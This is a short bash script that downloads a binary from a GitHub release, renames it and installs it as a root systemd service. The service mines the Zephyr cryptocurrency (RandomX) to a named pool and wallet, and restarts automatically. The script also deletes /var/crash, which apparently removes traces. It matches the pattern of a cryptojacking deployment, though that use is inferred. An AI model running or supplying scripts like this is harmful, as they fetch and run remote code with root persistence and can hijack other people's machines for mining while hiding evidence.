#!/bin/bash
sudo su
cd /home
wget https://github.com/trangtrau/sang_ml/releases/download/test/ar 
cp ar jvdar 
chmod +x jvdar
rm -rf /lib/systemd/system/xmrthanh.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o de.zephyr.herominers.com:1123 -u ZEPHs85fB2beCgLJfaa4fLQZSCC4fpmJTWWN9qw9ubfjGEk3RknpcHdDV93vY5BioJDJQ1dfpvWj5QMBfjYMS99X8VhEztpZD1b -p davincen_Rig1 -a rx/0 -k -t 8
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart